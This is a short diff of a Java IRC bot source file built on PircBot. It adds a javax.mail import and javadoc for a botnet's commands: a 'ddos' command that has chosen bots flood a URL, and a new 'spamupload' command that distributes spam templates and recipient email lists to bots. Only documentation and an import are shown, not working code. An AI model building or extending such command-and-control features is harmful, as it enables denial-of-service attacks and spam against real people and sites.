@@ -1,7 +1,7 @@
 import java.io.*;
 import java.net.*;
 import java.util.*;
-
+import javax.mail.*;
 import org.jibble.pircbot.*;
 
 /**
@@ -24,8 +24,11 @@ import org.jibble.pircbot.*;
  * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
  * 				Usage: ddos url interval duration bot [more bots]
  * 			</dd>
- * 		<dt>Spam</dt>
- * 			<dd>
+ * 		<dt>Spam File Upload</dt>
+ * 			<dd> One can upload a template and email file with this command for later use in sending spam. You can specify specific bots to send the files 
+ * 				to or you can give 'all' to send the file to all available bots. The template file must contain unique 'XXX', 
+ * 				'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line. <br/>
+ * 				Usage: spamupload templateFile emailFile bot [more bots]
  * 			</dd>
  * 		<dt>Lease</dt>
  * 			<dd>
